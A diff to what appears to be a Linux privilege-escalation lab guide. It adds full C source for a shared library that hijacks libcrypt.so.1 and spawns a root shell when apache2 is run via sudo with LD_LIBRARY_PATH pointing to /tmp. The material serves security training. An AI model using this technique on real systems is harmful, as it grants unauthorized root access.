@@ -506,10 +506,23 @@ Run ldd against the apache2 program file to see which shared libraries are used 
 ldd /usr/sbin/apache2
 ```
 
-Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the following code:
 
 ```
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+	unsetenv("LD_LIBRARY_PATH");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
 ```
 
 Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
